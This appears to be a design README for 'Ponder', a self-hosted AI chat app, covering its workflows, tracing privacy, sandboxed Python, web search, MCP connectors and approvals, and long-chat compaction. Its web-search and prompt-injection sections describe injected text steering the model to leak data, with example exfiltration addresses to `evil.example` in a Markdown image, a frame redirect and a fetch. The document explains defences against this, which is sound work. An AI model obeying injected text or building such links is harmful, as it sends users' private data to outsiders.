- Workspaces (`server/workspaces/admin.ts`): `GET /api/admin/workspaces` gives `{ org, private }`. `org` is each workspace open to everyone with its owner, `memberCount`, `costUsd` and documents (`{ id, name, mediaType, size, status, error, createdAt, progress, costUsd }`). `private` is `{ workspaces, documents: { reading, ready, failed }, costUsd, errors: [{ error, documents }] }`: no id, name, document or owner, and the names are cut out of each error. `GET /api/admin/workspaces/:id/documents/:doc/log` gives the `{ document, steps }` of a document in a workspace open to everyone, as the workspace's own log route does, and 404 for a document in a private workspace. An admin opens a private workspace only when its owner adds them.
- The "System" line reads `runs`, not `charged_runs`: the calls of `Runs.SYSTEM_FUNCTION_IDS` (chat names, memory and workspace embeddings, picture pages). They cost no one credits, so the numbers for each person do not change.
- The activity log keeps a workspace's instructions, up to 20,000 characters. The Activity page gets their length, and whether they changed, not the text.
- A "reply" is a `runs` row in `charged_runs` with `function_id` "chat", no `parent_id`, and a `finish_reason` other than "tool-calls". The chat workflow writes one "chat" row for each attempt at a model call, so a reply that used tools, or whose model call was tried again, has several rows. Only the last one counts.
- The OpenRouter key: an admin pastes it in Settings. The server checks it with OpenRouter, then saves it encrypted in the `secrets` table (AES-256-GCM, with a key derived from `BETTER_AUTH_SECRET`), so a copy of the database alone does not give it away. The key is never sent back to the page; Settings shows its last four characters. Until a key is saved there, `OPENROUTER_API_KEY` from the environment is used. A new `BETTER_AUTH_SECRET` makes the saved key unreadable: the server then uses `OPENROUTER_API_KEY` if it is set, and Settings asks for the key again.
- Role changes, bans and "sign out everywhere" go through Better Auth's admin plugin. A banned or signed-out person can keep using an open page for up to five minutes, because the session is cached in the cookie.
- The admin activity log is the `admin_events` table (`server/admin/AdminEvents.ts`). Only the server writes it, and nothing updates or deletes a row. Better Auth's admin endpoints are logged in its hooks (`server/auth/AdminAuthEvents.ts`), because an admin can call them at `/api/auth/admin/*` as well as through `/api/admin`. The other `/api/admin` routes log their own changes. The OpenRouter key's event says only that the key changed. The scripts in `scripts/` change the database directly and are not logged.
- An admin can change a person's email with Better Auth's `/api/auth/admin/update-user`. The admin can then sign in to that account with the new address. So each email change is logged, and the old address gets an email that names the new address and the admin.

### Logo

Ponder's logo is Lucide's message-square with a sparkle, in frappe-ui's `ink-gray-8` on `surface-base`, with a dark version from the same tokens' dark values. `scripts/logo.ts` draws `web/public/logo-light.svg`, `logo-dark.svg`, the favicon and the app icons from it.

An admin can replace it in Settings, Branding: an SVG, PNG, JPEG or WebP up to 1 MB, for light mode, dark mode or both. Dark mode without its own logo shows the light one. The images are in the `branding_logos` table (`server/branding/Branding.ts`). An SVG is kept as it is; a raster image becomes a PNG of at most 512px. `GET /api/brand` says which logos are set, and `GET /api/brand/logo/<theme>?v=<version>` sends one; both answer without sign-in, because the sign-in page shows the logo. The chat page gets the versions in its boot data. The pages show the logo in the sidebar, on the sign-in page, above a new chat and as the tab's icon (`web/brand.ts`, `web/BrandLogo.vue`).

### Durable replies

| Part | Where |
| --- | --- |
| The workflow: one reply | `server/workflow/chat.ts` |
| The agent loop: model calls, tool calls, approvals | `server/workflow/loop.ts`, `server/workflow/tool-calls.ts`, `server/workflow/approvals.ts` |
| One model call as a step, and its retries | `server/workflow/model-call.ts`, `server/workflow/model-attempt.ts`, `server/workflow/model-errors.ts` |
| The `runs` row of each model call | `server/telemetry/ModelCalls.ts` |
| Streams, reconnects, saving the reply | `server/workflow/reply.ts`, `server/workflow/runs.ts` |
| Start-up and shutdown of the worker | `server/startup.ts` |
| Browser: reconnects with `WorkflowChatTransport` | `web/ChatView.vue` |

- Nitro builds the server (`nitro.config.ts`) and compiles `"use workflow"` and `"use step"`. Runs are stored in Postgres (schemas `workflow` and `graphile_worker`). `npx --no-install bootstrap` creates them. Run it again after an upgrade of `@workflow/world-postgres`.
- Ponder runs its own agent loop, not `WorkflowAgent` from `@ai-sdk/workflow`. `WorkflowAgent` does not let a model call run again after its server stopped.
- Each model call is one step. The step calls `streamText` for one model call, with tools that have no `execute`, so the model only asks for tool calls. The loop runs them. Each tool call is its own step, so a model call that runs again never runs a tool again.
- The step writes the model's output to the reply's stream as it comes, in the format that `WorkflowAgent` used. `reply.ts`, `WorkflowChatTransport` and runs from before the change read it the same way.

A model call has 3 attempts. One attempt is one request to OpenRouter. The same 3 attempts cover errors and a server that stopped:

- A crash, a deploy or a restart in the middle of a call: the next server runs the call again.
- The model refused the request with a 4xx other than 408, 409 and 429: no other attempt. A bad request, a bad key, no OpenRouter credit or a missing model fails again.
- The AI SDK refused the call itself, with no HTTP status (such as a prompt it can't send): no other attempt.
- Any other error gets another attempt: 408, 409, 429, 5xx, a network error, a broken or empty stream, or an error of the server itself.
- The waits are 2 seconds before the 2nd attempt and 8 seconds before the 3rd, plus up to 1 second at random. A 429 with `Retry-After` waits that long, up to 30 seconds.
- A call that sends nothing for 10 minutes, or stops sending for 2 minutes, counts as failed. The first limit is long because a reasoning model that does not stream its thinking can think for minutes.
- Each attempt starts with a `reset-step` chunk. The page and the saved reply then drop what the earlier attempt wrote.
- After the 3rd attempt, the reply ends with an error, and the page shows Retry.

Each attempt that OpenRouter started is a row in `runs`:

- The row is written when the first chunk names the call (OpenRouter's generation id). So a call that a crash cuts short is in `runs` too.
- A finished call gets its tokens and cost from the response.
- A call that failed, or that a crash or Stop cut short, costs no credits (see "Credits").
- A stream that was cut does not report its cost. The sweep gets it from OpenRouter's generation API (`GET /api/v1/generation`) within a minute, after the reply goes on.
- A call that finished, but whose server stopped before the step saved its result, runs again. Its row becomes "retried", so only the new call is charged.

Tool calls:

- A connector call runs at most once. Its step has no retries. After a crash in the middle of the call, the workflow runtime fails the step and does not run it again. The model then reads that the call may or may not have taken effect.
- A call that can't run never runs, and the person is never asked about it:
  - A call to a tool that does not exist: the model reads the AI SDK's reason as the call's result, and the page shows an input error.
  - A call whose input fails the tool's own check (its zod schema, or `Catalog.check` for `connector_call`): the model reads the problem as the call's result.
  - Input that a model's output limit cut off is in the second group. OpenRouter sends it as `{}` when the finish reason is "tool_calls", and leaves the call out when it is "length".
- `web_search`, `web_fetch` and `run_python` run again after a crash. Each web search that runs again is charged again.
- A tool call that waits for the person ends the reply with a signed `tool-approval-request`. The signature is the AI SDK's format, keyed by `PONDER_TOOL_APPROVAL_SECRET`. The run after the person answers carries out the approved calls first (a `continued` run, `runs.ts`).

Workers:

- One server runs the worker. At start-up it waits for an advisory lock until the previous server is gone. Then it releases the jobs that a crash left locked (graphile-worker otherwise waits 4 hours). On SIGTERM it stops the worker and exits within 10 seconds.
- The page reconnects to a reply for up to 30 seconds while the server restarts (`patientFetch` in `web/ChatView.vue`).
- The flow route `/.well-known/workflow/v1/flow` has no authentication. The server listens on 127.0.0.1. In production the proxy must refuse that path.
- Stop cancels the run and saves what it wrote. The model call in flight still runs to its end on OpenRouter. Its row keeps its cost, as "stopped", and costs no credits.
- The sweep (`server/workflow/sweep.ts`) runs at start-up and then every minute, as two jobs on their own timers. One finishes the replies whose workflow run ended without saving them. The other gets the cost of calls that were cut short, and asks again later and later when OpenRouter can't tell yet: 1 minute, then 2, 4 and so on, up to 3 hours apart, for a day.
- The workflow runtime can fail a run outside `chatTurn`, which saves the reply on every other way out. An example is a reply in flight across a deploy that changed the reply loop's steps: its replay diverges. The sweep then ends the run's stream with an error and saves what the reply wrote, marked failed. A page that follows the reply stops and offers Retry, with no reload. Until the sweep runs, the thread shows the reply as running. `deploy/README.md` says when to deploy such a change.

### Tracing

Each reply can be one OpenTelemetry trace. A trace shows where the reply's time went and where it failed. Tracing is on when `OTEL_EXPORTER_OTLP_ENDPOINT` is set. Then Ponder sends spans with OTLP over HTTP to `<endpoint>/v1/traces`. In production, that is Jaeger on the same VM (`deploy/README.md`, "Traces"). Without the setting, tracing is off and loads nothing.

| Part | Where |
| --- | --- |
| The tracer provider, the batch and the exporter, started by a Nitro plugin | `server/tracing/setup.ts`, `server/plugins/tracing.ts` |
| One trace per reply | `server/tracing/reply-trace.ts`, `server/tracing/flow-middleware.ts` |
| What a span may carry | `server/tracing/privacy.ts` |
| HTTP spans | `server/tracing/http.ts` |
| Ponder's own spans | `Effect.fn("name")` in the services, on Effect's tracer (`server/tracing/Tracing.ts`); spans with given times in `server/tracing/reply-trace.ts` |

A reply's trace has these spans:

| Span | From | What it shows |
| --- | --- | --- |
| `invoke_agent ponder` | Ponder | The root: the whole reply, how it ended (`ponder.outcome`), the model, the thread and run ids |
| `credits.check`, `chat.request` | Ponder | The route, before the run starts |
| `queue.wait` | Ponder | Each step's time in the queue |
| `workflow.execute chatTurn`, `step.execute <step>` | Workflow | Each delivery and each step, with replays |
| `thread.load`, `file_context.resolve`, `pdf.extract_text`, `memory.recall`, `connectors.list` | Ponder | Context building |
| `invoke_agent <model>`, `step 1`, `chat <model>` | AI SDK (`@ai-sdk/otel`) | Each attempt at a model call: one `streamText` call of one step (`server/workflow/model-attempt.ts`), with tokens and time to first token (`gen_ai.client.operation.time_to_first_chunk`) |
| `execute_tool <tool>` | Ponder (`server/workflow/tool-spans.ts`) | Each tool call that ran. The reply loop runs tools in workflow code, which can't send spans, so the step that writes the results sends them, with the times the loop measured. A tool's own spans, such as `web_fetch.read`, are beside it, not under it |
| `mcp.call_tool`, `search.query`, `web_fetch.read`, `python.run` | Ponder | The work inside a tool |
| `compaction.run` | Ponder | A long chat's summary (see "Long chats"): how it ended (`ponder.outcome`) and the estimated tokens after it. The summarizer's model call is in it. |
| `GET`, `POST` | Ponder (`http.ts`) | Each HTTP request: OpenRouter, MCP servers, pages |
| `reply.save`, `memory.save` | Ponder | Saving the reply, and memory after it |

The title and memory's model calls are in the trace too. The names follow OpenTelemetry's GenAI conventions (`gen_ai.*`), so any OTel tool can read them.

One reply is one trace:

- A reply's trace id and root span id come from its run id (a SHA-256 of it). Every process that knows the run id gets the same ids, so nothing is stored.
- The workflow worker sends each step to `/.well-known/workflow/v1/flow`. A Nitro middleware reads the run id in the message and runs the step under the reply's root. So Workflow's spans, Ponder's spans and the AI SDK's spans join the trace, in every job, every replay, and in the server that goes on after a crash.
- The root span is sent last, when the run is marked finished (`ThreadRuns.finish` in `server/workflow/runs.ts`), with the run's start time. Every way a reply ends goes through there: saved, failed or stopped.
- After an approval, a new run carries on the message (see "Connectors"). It is a trace of its own. Its `chat.request` span links to the root of the run it carries on, and both have the same `gen_ai.conversation.id` (the thread id).
- Only replies are traced. A span with no reply above it, such as a page load or a queue poll, is not sampled.

Privacy: admins see usage, never chats (see "Admin"), and traces keep that promise. A span never has message text, prompts, tool inputs or outputs, connector results, file names, or the path and query of an address. It has names, times, status, token counts, model and provider ids, and the thread and run ids. Two parts make sure of this:

1. At the source. The AI SDK's integration is told for every event not to record inputs or outputs, whatever the call asked. HTTP spans record the method, the status and the kind of peer (`ponder.peer`: `openrouter`, `mcp`, `web`). They record the host for OpenRouter only, because a subdomain can carry data, and a connector's host tells which apps a person uses. No `traceparent` header goes out, so a page or an MCP server learns nothing about the trace.
2. At export. An allowlist (`server/tracing/privacy.ts`) keeps only known attribute keys. It drops error messages, events other than `exception` (which keeps only its type) and status messages. A span name of an unknown shape becomes `span`. A library that starts to record a new attribute sends nothing until the key is added there. A value that comes from outside Ponder's code, such as a tool name, a response id or an error type, must look like a name, or it is dropped.

Tool names stay, as in `runs`, but never the name the person gave a connector, which tells which apps they use. This is the same rule as for a connector's host. The model reaches a connector's tools through `connector_search` and `connector_call` (see "Connectors"), so the tool spans are `execute_tool connector_search` and `execute_tool connector_call`. The real tool, `<connector>__<tool>`, is in the call's input, which is never recorded. `mcp.call_tool` records the tool's own name, which the MCP server gives. If a span ever carries a name of the shape `<connector>__<tool>`, the allowlist changes it to `connector__<tool>`.

`server/tracing.check.ts` checks both with a marker in every place content could come from. `e2e/tests/tracing.spec.ts` checks the whole path: a reply whose message, file, address and connector input hold a marker exports no span with it.

Errors and warnings logged inside a trace end with ` trace_id=<id>`. Paste the id in Jaeger's search to open the trace.

Settings:

| Setting | Default | What it does |
| --- | --- | --- |
| `OTEL_EXPORTER_OTLP_ENDPOINT` | not set: off | Where spans go, such as `http://127.0.0.1:4318`. It must start with `http://` or `https://`. Another value logs a warning, and Ponder starts with tracing off. |
| `OTEL_SERVICE_NAME` | `ponder-chat` | The service name in Jaeger |
| `OTEL_BSP_SCHEDULE_DELAY` | `2000` | Milliseconds spans wait to be sent in one batch |

To see traces on your machine:

1. Start Jaeger: `docker run --rm -d --name jaeger -p 127.0.0.1:16686:16686 -p 127.0.0.1:4318:4318 jaegertracing/jaeger:2.23.0`.
2. Add `OTEL_EXPORTER_OTLP_ENDPOINT=http://127.0.0.1:4318` to `.env` (for `npm run dev`) or to the environment of `./start.sh`.
3. Send a message, then open http://localhost:16686 and pick the service `ponder-chat`.

For the end-to-end tests, set `E2E_OTEL_ENDPOINT=http://127.0.0.1:4318`. Without it, the tests send their traces to the fake OpenRouter, which `tracing.spec.ts` reads.

Cost: with tracing off, the server loads only `@opentelemetry/api` (63 kB). With it on, the start-up time does not change measurably, and the server uses about 6 MB more memory. A reply is 50 to 200 spans, median 100 in the end-to-end tests. Most are Workflow's, about 7 for each step, so the count grows with the steps, not with the length of the reply. Workflow also makes a `workflow.stream.flush` span for each write to the reply's stream, hundreds for a long reply. Ponder leaves those out.

On SIGTERM, Ponder closes the database first, then sends the spans that are left for at most 2 seconds. A collector that is down or does not answer costs each batch at most 2 seconds, and never holds up the stop.

Limits:

- A process that is killed (`kill -9`, out of memory) loses the spans it had not finished, such as the step it was running. The spans it had sent stay in the trace, and Jaeger shows them without their parent.
- A run that stops to ask for an approval does not send the AI SDK's `step` span of its last model call. That model call's `chat` span shows without its parent.
- The root span is sent from the run's last step, while it saves the reply. So `reply.save`, `memory.save` and the last `workflow.execute` end a little after the root, and the root's duration is short by that much.
- Spans wait up to 2 seconds in memory before they are sent. A crash in that time loses them, the root span too when it is among them. The trace then shows without its root.
- `runs` stays the record of usage and credits. Traces are for finding where a reply was slow or failed, and are kept for 7 days.

### Python

`sandbox/pyodide/` is adapted from LangChain's pyodide-sandbox (MIT): each run is a new Deno process with no permissions except reading Pyodide and the vendored packages. No network, no environment, no writes, no subprocesses. Variables, imports and files in `/work` are kept per chat in Postgres (`python_state`). Set up once with `npm run sandbox:setup` (needs Deno and uv). Limits: `PYTHON_MAX_RUNS` (3 at once), `PYTHON_MEMORY_MB` (1536), 60 seconds a run.

### Web search

The model sees two tools of our own (`server/search/schema.ts`), whatever runs them behind:

- `web_search`: a backend from `SEARCH_BACKEND` (`server/search/backend.ts`). The only one now is `openrouter`: a cheap model (`PONDER_SEARCH_MODEL`) makes one search with OpenRouter's `web_search` server tool on Exa, and its citations are the results. It needs no other API key. The model call goes to a Zero Data Retention endpoint, but Exa keeps queries by its own rules. For more privacy later: a search API with a zero-retention contract (Brave, Exa or Parallel enterprise) or a SearXNG we host, as one more backend.
- `web_fetch`: reads the page on our own server (`server/search/fetch-page.ts`), so no other company sees it. It refuses every address on this machine, the tailnet and private networks, checked when each connection opens and on each redirect. Only ports 80 and 443; at most 3 MB and 20,000 characters of text.
- `web_fetch` reads an address on its own only when the person wrote it in a message, a `web_search` in the chat returned it, or the person already let it read that page (`server/search/trusted-pages.ts`). Any other address waits for the person: the confirmation shows the whole address. Text in a page, a connector's result or an attached file can tell the model to put private data in an address, such as `https://evil.example/?d=...`, and the request itself would send it out. Addresses in attached files and in memory do not count as the person's.
- Web and Research (`shared/web-mode.ts`, `web/web-tools.ts`): each message of the person carries its choice in its metadata, `off`, `search` or `research`, so it is saved with the thread, and a Retry reads it again. `server/workflow/chat.ts` gives the model the tools by it. With `off`, the model has neither `web_search` nor `web_fetch`, so no text can talk it into a search. A message with no choice searches, as before.
- Deep research: `web_search` is the same tool, run as a deep search. The `openrouter` backend sets Exa's `mode` to `deep` and asks for 10 results; it takes 4 to 15 seconds and costs about $0.012, so 12 credits. The instructions ask for several searches and a report with a citation for each fact.
- Sources only: in a workspace chat with the web off, the workspace's guidance (`WORKSPACE_ONLY_GUIDANCE` in `server/workspaces/prompt.ts`) makes the documents the only source of facts. The model calls `offer_web_search` when they do not have the answer; the tool runs nothing, and the page draws it as "Search the web for this". That button sets the person's message to one search and asks again; the chat's own switch stays off.
- Citations: the model cites with a Markdown link right after each fact. In the page, a link to a page that a search returned or `web_fetch` read shows as a small chip; hovering or focusing it shows the page's title and an excerpt.

### Prompt injection

A page, an email from a connector or an attached file can hold text that tells the model what to do. The model can't reliably tell that text from the person's, so Ponder does not rely on the model to ignore it. It closes the ways that private data could leave without the person seeing it:

- Images: the app's pages have a Content Security Policy (`server/app.ts`) that loads images and media only from Ponder, `data:` and `blob:` URLs, and the CDNs an HTML artifact may use. A Markdown image in a reply, such as `![](https://evil.example/?d=...)`, would otherwise load as soon as the reply shows. Artifact frames are `srcdoc` frames, so they are held to this policy too, as well as their own.
- Frames: the same policy has `frame-src 'none'`, so no frame loads an address. An HTML artifact runs script in its frame, and could otherwise send the frame itself to `https://evil.example/?d=...`, by script or by a meta refresh. A `srcdoc` frame loads no address, so artifacts and slides still show.
- `web_fetch`: asks first for an address that the person did not give and no search returned (see Web search).
- Connector tools that change something are on "Ask first" by default, and Python has no network.
- What a connector's server says about itself comes with search results, as tool data, not in the instructions.

What is left: a link in a reply can carry data when the person clicks it, and a `web_search` query goes to Exa.

### Connectors

Settings › Connectors (Settings is in the account menu) lists the MCP servers the person connected. The code is in `server/mcp/` and `server/workflow/connectors.ts`; the page is in `web/connectors/` and `web/settings/`. The plan and its reasons are in `docs/connectors-plan.md`.

- Add connector takes the URL of a remote MCP server (Streamable HTTP, or SSE for old servers). While the person types, the server sends it an `initialize` request (`server/mcp/probe.ts`) and says whether it needs no sign-in, an API key, or an OAuth sign-in. No stdio: Ponder never runs a command that a person typed.
- OAuth: `@ai-sdk/mcp` runs the flow the MCP spec asks for (discovery, dynamic client registration, PKCE, state and issuer checks). The sign-in opens in a popup and ends at `/oauth/mcp/callback`, which tells the page on a `BroadcastChannel` and closes. On a phone, the sign-in uses the same tab and comes back to `/?settings=connectors`. For a server that does not allow dynamic registration (GitHub), the person registers their own OAuth app and enters its client ID and secret under Advanced.
- Credentials (header values, OAuth client, tokens) are one value per connection in `mcp_connections.credentials`, encrypted with AES-256-GCM and bound to the row (`seal` in `server/secrets/Secrets.ts`). The key comes from `PONDER_ENCRYPTION_KEY` when it is set, else from `BETTER_AUTH_SECRET`. A sealed value names its key, so setting `PONDER_ENCRYPTION_KEY` later keeps the older values readable while `BETTER_AUTH_SECRET` stays the same. The page never gets a credential: only header names.
- Every request to an MCP server or its OAuth endpoints goes through the same guard as `web_fetch` (`server/net/NetGuard.ts`): https, public addresses only, checked on each connection. For development and the checks only, `MCP_ALLOW_PRIVATE_NETWORKS=1` turns the guard off for connectors.
- Rules: each tool is named `<slug>__<tool>`, such as `linear__create_issue`. A tool that says it only reads (`readOnlyHint`) starts on "Always allow". Every other tool starts on "Ask first". The person can set each tool to "Always allow", "Ask first" or "Off", and turn a connector off. The tool lists are kept in the database and listed again in the background when they are more than an hour old.
- A catalog, not a tool list: connector tools are not tools of their own. The model gets two tools when the person has a connector on. `connector_search` searches the person's connector tools and returns each match's exact name and a short TypeScript-like signature of its input. `connector_call` calls one: `connector_call({ tool: "linear__create_issue", input: {...} })`. Connecting, changing or removing a connector then changes neither the tools nor the instructions, so the provider's cache keeps them (see "What the model reads"). The design follows vercel/eve's deferred tool catalog (`server/mcp/catalog.ts`).
- Search ranks by keywords, with no embeddings (`server/mcp/rank.ts`). An exact name ranks first. Next come the name without its slug, then a connector's slug or name, then the start of a name. Last come other words, weighted by where they match: the tool's name, the connector, the input's property names, then the descriptions. A query word matches a word that it starts, or the word with an ending: "categories" finds category, "copied" copy, "seeing" see, and in names "shipping" finds ship and "committed" commit. Short words don't take "d", "ed" or "ing", so "add" does not match "ad", and words such as "being" and "incoming" are words of their own. Filler words such as "the" and "for" match nothing. Descriptions also keep each word whole, and a query word also matches two adjacent words of a name joined, as a whole word, so "github" finds "GitHub" and `searchGitHub`. Words in any script count, with their combining marks and zero-width joiners. A run of more than eight marks is cut before the text is normalized, and a server's names and titles are cut to 200 characters: NFC sorts a run of marks in time that grows with its square. Thai and Chinese have no spaces, so a phrase in them is one word, found only by its start. A query such as `linear__` lists one connector's tools. Results also carry what each connector's server says about itself (its MCP instructions). A query is at most 300 characters, and only its first 16 distinct words are scored, so a long query can't hold up the server. The output is cut at 20,000 characters, and the results past that count as remaining.
- The connector note: a `<connectors>` note with the person's latest message names their connectors. A connector that needs a new sign-in, or whose server fails, stays in the note with no tools, so the tools and the instructions don't change while it is down. While every tool fits in 3,000 characters, the note also lists each tool with its signature, so with a few tools the model calls one without a search first. The servers write the descriptions and schemas, so the note never shows their `<` or `>`: a signature's show as `‹` and `›`, and others are removed. A server can't close the note and write text that reads as the person's. Search results and errors show signatures as they are.
- Input: `connector_call` finds the tool by its exact name, and checks the input against the tool's JSON schema with Ajv, as WorkflowAgent checks a tool's input, before anything else. A call that does not fit runs nothing and asks nothing. The model gets what is wrong and the tool's signature. A name that is not in the catalog, such as one with a space added, gets the closest names. A call to a tool the person turned off, such as one turned off while its approval waited, does not run, and the model reads that it is off.
- In a reply, one step reads the person's catalog as plain data, so a replay uses the same tools. Search and the input check are pure, so they need no step. Each call is its own step that connects (`server/mcp/client.ts` keeps a client per connection for 2 minutes). A call is never retried: it could create something twice. A failure is the call's result, so the model can tell the person. Results are cut at 50,000 characters.
- Approvals: a call to a tool on "Ask first" stops the reply with a confirmation (Deny, Always allow, Allow once). The rule, the question and "Always allow" are those of the real tool behind `connector_call`, and the confirmation shows that tool's input. The answer goes out by itself and a new run carries on the same message (`continued` in `server/workflow/runs.ts`). Approval requests are signed (`experimental_toolApprovalSecret`, derived from `BETTER_AUTH_SECRET` at startup), so only a call the model asked for can be approved. The signature covers the whole input of `connector_call`, so it covers the real tool's name and its input too. `needsApproval` looks the tool up by the same exact name, and asks when it finds none. As a last guard, the call step reads the rule again and refuses a tool on "Ask first" unless the person approved this call. Whether they did comes from the signed approval in the reply's messages, not from the catalog: the latest call with this id, with the same input, its approval request, and a later approving answer, with no denial. So a call that got past `needsApproval` some other way still does not run, and an approval of an earlier call with a reused id does not count. Each answer is used once (`server/workflow/approval-uses.ts`). It must answer a question that still waits in the saved thread, and the `approval_uses` table records its use before the run starts, so before the call can reach the app. The page shows a question when the run that asked it ends its stream, and the run saves it a moment later, so an answer to the running reply's own question first waits for that save, up to 10 seconds. Stop, a failed run and Retry keep the record; deleting the chat removes it. An answer sent again, such as from a second tab, after Stop or after Retry, runs nothing and saves nothing. The page gets each answer's outcome, then loads the chat as it is saved (`server/workflow/answered-again.ts`). An approved call that was sent but has no result, because Stop or a crash cut its run short, never runs again: the chat and the model read that it may or may not have taken effect.
- Older replies called each connector tool by its own name. The model reads those calls as `connector_call`, and the chat names them the same way as new ones.
- A token that expires within a minute is refreshed before a call, one refresh at a time for each connection. When the server refuses the sign-in, the connector shows "Sign in again", and the model is told to ask the person.
- Limits: 30 probes, adds, sign-ins and refreshes in 10 minutes per person (`connectorLimit`). A reply's catalog keeps at most 500 tools and 2 MB, as a safety limit. Over it, each connector gives up tools in turn, so none is left out entirely. The note tells the model how many tools were left out.

### Files

`server/files.ts` stores uploads; `server/file-context.ts` turns them into what the model reads before each call.

- Images: the upload must really be a PNG, JPEG, WebP or GIF. A photo larger than 1,568 pixels on its long side is made smaller, and its metadata (such as where it was taken) is removed (`server/image-resize.ts`). GIFs stay as they are.
- PDFs: the upload must start like a PDF. While the admin setting "Read PDF text on this server" is on (the default), the server reads each PDF's text once with pdf.js (`server/pdf-text.ts`) and keeps it in `files.text`. A model that can't read PDFs gets that text. A model that can read PDFs always gets the PDF. A scan has no text, so it goes as a PDF. pdf.js runs in a worker thread (`server/pdf-text-worker.ts`), two PDFs at a time, because a small PDF can be made to take hours to read. A read that takes more than 20 seconds or 256 MB is stopped, and that PDF is kept as one with no text. With the setting off, every PDF goes to the model, and for models that can't read PDFs OpenRouter's free `cloudflare-ai` parser reads it on every call.
- Text files: up to 200,000 characters each.
- All file text in one model call: at most 300,000 characters, newest files first. A file that does not fit is named, and the model is told to ask for it again in a new chat.

### What the model reads

`server/workflow/context.ts` and `server/workflow/cache.ts` keep each call small, and its start the same from one call to the next, so that providers can cache it.

- Tool output (Python, pages read, search results) is kept whole for the current turn and the one before, so a follow-up such as "what else did that page say?" needs no new call. After that, output longer than 3,000 characters is cut to its first 1,000.
- What memory recalls goes with the person's latest message, not in the instructions, because it changes with every message.
- The `<connectors>` note goes there too. Connector tools are reached through `connector_search` and `connector_call`, which never change, so a new or changed connector leaves the tools and the instructions as they were (see Connectors).
- Anthropic's models cache only what a request marks, at most four places. Ponder marks the instructions, the history before the two whole turns, the history before the latest turn, and the last message. A cached read costs a tenth of the price. Each call reads from the cache everything before the latest turn, or before the turn before it when that turn's long tool output was just trimmed. Other providers cache the start of a prompt by themselves.

#### Long chats

A chat can grow longer than its model can read. `server/compaction/` and `server/workflow/context-guard.ts` summarize the older part before that happens. The design comes from the compaction engine of [vercel/eve](https://github.com/vercel/eve) (`packages/eve/src/harness/compaction/`).

- When: before a call goes over 90% of the model's window, or over 200,000 tokens, whichever is lower. Longer calls cost more and answer worse. The window is the smallest `context_length` among the model's private (ZDR) endpoints on OpenRouter. When it is not known, Ponder takes 128,000.
- The count: before a reply's first call, Ponder estimates the tokens from the size of the messages, the instructions and the tools. It multiplies the text estimate by the thread's ratio of measured tokens to estimated tokens, which each call updates (1.6 until the first call is measured). Images and PDFs are estimated from their size and are not multiplied. Because that estimate is only a guess, it never refuses a message or drops a file by itself. Between the steps of a reply, it takes the last call's measured input tokens and adds an estimate of the tool results since.
- What is summarized: the previous summary and the messages after it, up to the current turn, go to the summarizer. Each role is marked with a tag that has a new random id on each call, so a tool result cannot pose as the person. Tool calls and results reach it cut to 2,000 characters. A call that the person refused, or that did not finish, is marked as not run. The last 20,000 tokens of whole turns stay word for word, and so does the current turn.
- The summary replaces the messages it covers. It is one message from the person's side, right after the instructions. It says that a model wrote it and that it is not a new request.
- Saved and used again: the summary is saved in `thread_summaries`, with the number of messages it covers and a fingerprint of the ids and text of all the messages the summarizer read. Later calls use it while those messages stay the same, so the start of each call stays the same and the cache keeps working. Retry changes only the last reply, so it keeps the summary. A change to any message the summarizer read makes the summary stale, and the next compaction writes a new one.
- Between steps: when a reply's own tool results make it too long, everything before the current turn is summarized, if that can bring the call back under the point in "When". A file stays whatever is summarized, so a large PDF alone never causes a second summary. If the turn alone is still too long, the long tool results of its earlier steps are cut, as for older turns.
- Never summarized: the instructions, what memory recalls, and the `<connectors>` note (both go with the latest message on each call). The summary message also carries these word for word:
  - the files of the summarized part, read in full under the file budget below
  - the skills chosen there with `$name`
  - the latest version of each artifact written there, up to 40,000 tokens
- When there is still not enough room: Ponder names the files of the summarized part instead of sending them. Then it keeps only the current turn. A message that does not fit even then gets "This message is too long for …".
- The summarizer: DeepSeek V4.1 Flash. Admins can choose another model that has a ZDR endpoint in Settings, Long chats. Ponder uses the chat's own model when the chosen one is not available, or when its window is too small. The call goes to a ZDR endpoint and is charged to credits (see "Credits").
- A failed summary does not fail the reply. A summary that takes more than three minutes, or that is cut off at the output limit, counts as failed. After three tries, the reply leaves out the old messages with a note, nothing is saved, and the next reply tries again. The failure is logged as `reply degraded`.
- The page: while the summary is written, the reply shows "Compacting earlier messages". After it, a divider follows the last summarized message. Each later reply that reads the saved summary shows the divider again, so it stays after Retry. The chat itself keeps every message: search, export and memory still read all of them.
- Compaction runs in a workflow step, so a run that replays never summarizes twice. The reply loop runs it before each model call, in a step apart from the model call's (`server/workflow/loop.ts`), so a model call that is tried again does not summarize again. A step that is tried again after the save uses the saved summary. A run that was stopped or replaced does not save its summary. `server/compaction.check.ts`, `server/compaction-flow.check.ts` and `e2e/tests/compaction.spec.ts` test it.

### Limits

- Per person, in memory (`server/limits/RateLimits.ts`): 12 messages a minute and 200 an hour; 30 uploads in 10 minutes and 150 a day; 3 requests for credits an hour; 60 chat searches a minute. Over a limit, the answer is 429 with `Retry-After`. A restart clears the counts.
- Sign-in (Better Auth, `server/auth/Auth.ts`), per address: 5 sign-in emails in 10 minutes, 10 code tries and 10 link opens in 10 minutes, 100 other requests a minute. The address comes from `cf-connecting-ip` (Cloudflare), else `x-forwarded-for`.

### Code

| Part | Where |
| --- | --- |
| HTTP API | `server/app.ts` |
| Sign-in, invites and admins | `server/auth/Auth.ts`, `server/people/Invites.ts`, `server/people/Accounts.ts`, `web/SignIn.vue` |
| Admin pages | `server/admin/`, `web/admin.html`, `web/admin/` |
| Chat workflow | `server/workflow/` |
| Python tool and sandbox | `server/python/`, `sandbox/pyodide/` |
| Files and what the model reads of them | `server/files.ts`, `server/file-context.ts`, `server/image-resize.ts`, `server/pdf-text.ts` |
| Trimming, memory placement and prompt caching | `server/workflow/context.ts`, `server/workflow/cache.ts` |
| Summaries of long chats | `server/compaction/`, `server/workflow/context-guard.ts`, `web/compaction.ts` |
| Rate limits | `server/limits/RateLimits.ts`, `server/rate-limit.ts` |
| Search in chats, Markdown export | `server/thread-search.ts`, `web/thread-search.ts`, `web/export-markdown.ts` |
| Cards in a reply (OpenUI) | `shared/genui.ts`, `server/genui/`, `web/genui/`, [`docs/cards.md`](docs/cards.md) |
| Citation chips | `inline-citation/collect.ts`, `CitationCard.vue` and `response/Response.vue` in [frappe-ui-ai-elements](https://github.com/bwhtech/frappe-ui-ai-elements) |
| Models | `server/models/Models.ts`, `web/models.ts` |
| OpenRouter key and other secrets | `server/openrouter/OpenRouterKey.ts`, `server/secrets/Secrets.ts` |
